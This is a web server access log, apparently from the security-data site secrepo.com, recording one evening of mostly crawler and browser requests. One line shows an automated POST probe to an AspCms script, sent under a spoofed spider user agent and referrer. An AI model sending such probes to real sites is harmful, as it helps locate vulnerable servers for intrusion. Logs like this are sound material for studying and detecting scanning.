157.90.181.151 - - [22/Oct/2021:15:50:52 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:51:34 -0700] "GET /data HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:05 -0700] "GET /self.logs/2015/ HTTP/1.1" 200 7621 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:13 -0700] "GET /self.logs/2016/ HTTP/1.1" 200 7860 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:21 -0700] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 32375 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:26 -0700] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 33677 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:31 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 33101 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
157.90.181.151 - - [22/Oct/2021:15:52:36 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 38322 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" 
49.7.20.116 - - [22/Oct/2021:15:58:33 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
85.208.98.51 - - [22/Oct/2021:16:16:44 -0700] "GET /robots.txt HTTP/1.1" 301 439 "-" "Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)" 
85.208.98.51 - - [22/Oct/2021:16:16:50 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; SemrushBot-BM/1.0; +http://www.semrush.com/bot.html)" 
154.6.28.199 - - [22/Oct/2021:16:17:53 -0700] "GET / HTTP/1.1" 200 13185 "https://www.reddit.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
154.6.28.199 - - [22/Oct/2021:16:17:53 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
154.6.28.199 - - [22/Oct/2021:16:17:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
154.6.28.199 - - [22/Oct/2021:16:17:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
154.6.28.199 - - [22/Oct/2021:16:17:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
49.7.20.116 - - [22/Oct/2021:16:19:54 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
49.7.20.128 - - [22/Oct/2021:16:24:00 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
154.51.131.142 - - [22/Oct/2021:16:40:26 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
154.51.131.142 - - [22/Oct/2021:16:40:27 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
49.7.20.116 - - [22/Oct/2021:16:42:01 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
27.158.48.59 - - [22/Oct/2021:16:49:29 -0700] "POST /plug/collect/AspCms_CollectFun.asp HTTP/1.1" 408 391 "http://misc.yahoo.com.cn/" "Mozilla/5.0+(compatible;+Baispider/2.0;++http://www.bai.com/search/spider.html)" 
49.7.20.116 - - [22/Oct/2021:17:02:59 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
42.236.10.108 - - [22/Oct/2021:17:16:56 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/" "-" 
42.236.10.107 - - [22/Oct/2021:17:17:15 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/" "-" 
